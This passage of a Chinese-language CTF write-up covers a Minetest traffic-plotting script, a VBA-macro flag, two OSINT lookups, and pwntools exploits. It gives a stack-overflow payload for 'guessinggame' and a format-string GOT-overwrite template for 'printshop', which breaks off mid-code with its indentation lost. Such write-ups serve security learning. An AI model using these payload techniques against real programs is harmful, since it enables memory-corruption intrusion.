class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.animation <span class="keyword">import</span> FuncAnimation</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;data.json&#x27;</span></span><br><span class="line"></span><br><span class="line">json_data_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json_data_list = json.load(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">coordinates = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> json_data <span class="keyword">in</span> json_data_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        playerpos_x = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_x&quot;</span>]</span><br><span class="line">        playerpos_y = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_y&quot;</span>]</span><br><span class="line">        playerpos_z = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_z&quot;</span>]</span><br><span class="line"></span><br><span class="line">        coordinates.append(&#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: playerpos_x,</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: playerpos_y,</span><br><span class="line">            <span class="string">&quot;z&quot;</span>: playerpos_z</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># print(coordinates)</span></span><br><span class="line"></span><br><span class="line">x_values = [<span class="built_in">int</span>(point[<span class="string">&#x27;x&#x27;</span>] * <span class="number">10</span>) <span class="keyword">for</span> point <span class="keyword">in</span> coordinates]<span class="comment"># 放大x的值，要不然图会挤在一起</span></span><br><span class="line">z_values = [<span class="built_in">int</span>(point[<span class="string">&#x27;z&#x27;</span>]) <span class="keyword">for</span> point <span class="keyword">in</span> coordinates]</span><br><span class="line"></span><br><span class="line">plt.scatter(x_values, z_values, marker=<span class="string">&#x27;o&#x27;</span>, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/11/hszevpHMWa9oNLD.png" alt=""></p><h2 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h2><p>给了个word文档，里面嵌入VBA宏代码了，找到word的开发工具打开，flag就在x49变量里面</p><p><img src="https://s2.loli.net/2023/09/11/4KVEGexpBJCoTzA.png" alt=""></p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Rouge-Access-Point"><a href="#Rouge-Access-Point" class="headerlink" title="Rouge Access Point"></a>Rouge Access Point</h2><blockquote><p>We’ve received a notice from our companies EDR software that a laptop was attacked while they were on WFH. The employee says they were at home when it happened, but we suspect they were using public wifi. Our EDR software managed to capture the BSSID of the wifi (<strong>46:D1:FA:63:BC:66</strong>) network before it got disconnected, but not the SSID. Can you still find the network they were connected to?</p></blockquote><p>给了bssid，尝试找ssid，wigle数据库一查就查出来了</p><p><a href="https://wigle.net/search#detailSearch?netid=46%3AD1%3AFA%3A63%3ABC%3A66">https://wigle.net/search#detailSearch?netid=46%3AD1%3AFA%3A63%3ABC%3A66</a></p><p><img src="https://s2.loli.net/2023/09/11/MWuLabS6T24vZ5h.png" alt=""></p><h2 id="Satellite-Killer（好活）"><a href="#Satellite-Killer（好活）" class="headerlink" title="Satellite Killer（好活）"></a>Satellite Killer（好活）</h2><p>题目描述：</p><blockquote><p><strong>Easy</strong></p><p>Most satellites get to live out a relatively peaceful existence in space until their orbit eventually decays and they fall back to Earth.</p><p>Most.</p><p>Back in the 80’s, one poor satellite met a premature end at the hands of an ASM-135.</p><p>I would like you to find the date that the second-to-last piece of its debris fell back down to Earth (Or more realistically, its decay date).</p><p>In addition, please give me its object ID/International Code.</p><p><em>Flag format: PCTF{OBJECTID_YEAR-MONTH-DAY} </em></p><p><em>For example, for a piece of debris from the Falcon 9, the flag would look like this: PCTF{2023-028BG_2023-3-15}</em></p></blockquote><p>尝试找一颗卫星的倒数第二碎片的坠落时间和编号，首先在维基上找到如下内容：</p><p><a href="https://en.wikipedia.org/wiki/Solwind">https://en.wikipedia.org/wiki/Solwind</a></p><p><a href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#cite_note-8">https://en.wikipedia.org/wiki/Anti-satellite_weapon#cite_note-8</a></p><p>然后给出了最后一块碎片的坠落时间，去查维基百科相关引用，可以找到一个卫星数据库，<a href="https://www.space-track.org/。">https://www.space-track.org/。</a></p><p><img src="https://s2.loli.net/2023/09/11/843XoUJmydeLuVY.png" alt=""></p><p>这个web网站提供了调用的相关API，当然也可以手动翻几页，就能找到对应的数据：<a href="https://www.space-track.org/basicspacedata/query/class/satcat/NORAD_CAT_ID/16085/format/html/emptyresult/show">https://www.space-track.org/basicspacedata/query/class/satcat/NORAD_CAT_ID/16085/format/html/emptyresult/show</a></p><p><img src="https://s2.loli.net/2023/09/11/Ydk5RyFOLowlCGb.png" alt=""></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>没咋做，难的不会，简单的又太简单</p><h2 id="guessinggame"><a href="#guessinggame" class="headerlink" title="guessinggame"></a>guessinggame</h2><p><img src="https://s2.loli.net/2023/09/11/rQ9ChceSXJxKg4E.png" alt=""></p><p>简单栈溢出，ret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./guessinggame&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;chal.pctf.competitivecyber.club&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./guessinggame&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">    payload = (<span class="number">0x130</span> - <span class="number">0x4</span>) * <span class="string">&#x27;a&#x27;</span> + p32(<span class="number">1</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="printshop"><a href="#printshop" class="headerlink" title="printshop"></a>printshop</h2><p>简单的格式化字符串，只需要把exit改为后门函数地址即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./printshop&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;chal.pctf.competitivecyber.club&quot;</span>, <span class="number">7997</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./printshop&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string_template_64</span>(<span class="params">location_arg,target,after_change,len_other_string = <span class="number">0</span>,ljust_location = <span class="number">0x50</span>,bit = <span class="number">0x6</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">1</span>:</span><br><span class="line">low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload + p64(target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">2</span>:</span><br><span class="line">low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload + p64(target)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">3</span>:</span><br><span class="line">low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload + p64(target)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">4</span>:</span><br><span class="line">low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line"></span><br><span class="line">c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload + p64(target)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">5</span>:</span><br><span class="line">low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload + p64(target)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bit == <span class="number">6</span>:</span><br><span class="line">low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">low6 = (after_change &amp; <span class="number">0xff0000000000</span>) &gt;&gt; <span class="number">40</span></span><br><span class="line"></span><br><span class="line">c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">c6 = (low6 - low5 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">location_arg6 = location_arg5 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span 